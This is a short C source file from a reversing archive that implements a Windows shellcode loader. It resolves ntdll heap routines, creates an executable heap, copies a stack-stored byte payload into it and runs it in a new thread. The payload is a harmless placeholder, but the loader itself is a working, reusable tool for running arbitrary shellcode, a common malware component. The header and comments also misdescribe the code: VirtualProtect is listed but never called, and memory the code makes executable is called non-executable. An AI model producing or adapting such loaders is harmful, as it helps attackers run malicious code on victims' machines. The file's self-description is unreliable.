/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload in stack

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: RtlAllocateHeap
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

/* ========= some definition ========= */
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)

#define PAGE_SIZE 4096

/* ========= function signatures ========= */
typedef PVOID RtlAllocateHeap_t (PVOID, ULONG, SIZE_T);
typedef RtlAllocateHeap_t FAR * pRtlAllocateHeap;

typedef PVOID RtlCreateHeap_t (ULONG, PVOID, SIZE_T, SIZE_T, PVOID, PVOID);
typedef RtlCreateHeap_t FAR * pRtlCreateHeap;

typedef VOID RtlFreeHeap_t (PVOID, ULONG, PVOID);
typedef RtlFreeHeap_t FAR * pRtlFreeHeap;

typedef PVOID RtlDestroyHeap_t (PVOID HeapHandle);
typedef RtlDestroyHeap_t FAR * pRtlDestroyHeap;


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HMODULE     ntdll;
    PVOID       heap;

    // function pointer to internal API
    pRtlAllocateHeap    RtlAllocateHeap;
    pRtlCreateHeap      RtlCreateHeap;
    pRtlFreeHeap        RtlFreeHeap;
    pRtlDestroyHeap     RtlDestroyHeap;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    RtlAllocateHeap = (pRtlAllocateHeap) GetProcAddress(ntdll, "RtlAllocateHeap");
    RtlCreateHeap   =  (pRtlCreateHeap)  GetProcAddress(ntdll, "RtlCreateHeap");
    RtlFreeHeap     =   (pRtlFreeHeap)   GetProcAddress(ntdll, "RtlFreeHeap");
    RtlDestroyHeap  = (pRtlDestroyHeap)  GetProcAddress(ntdll, "RtlDestroyHeap");

    // create independent heap with enough size to hold all the shellcode
    heap = RtlCreateHeap (HEAP_CREATE_ENABLE_EXECUTE, NULL, 0, 0, NULL, NULL);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = RtlAllocateHeap (heap, HEAP_ZERO_MEMORY, payload_len);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // execute the code
    h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
    WaitForSingleObject (h_thread, -1);

    // free the heap and destroy
    RtlFreeHeap (heap, 0, runtime);
    RtlDestroyHeap (heap);

    return 0;
}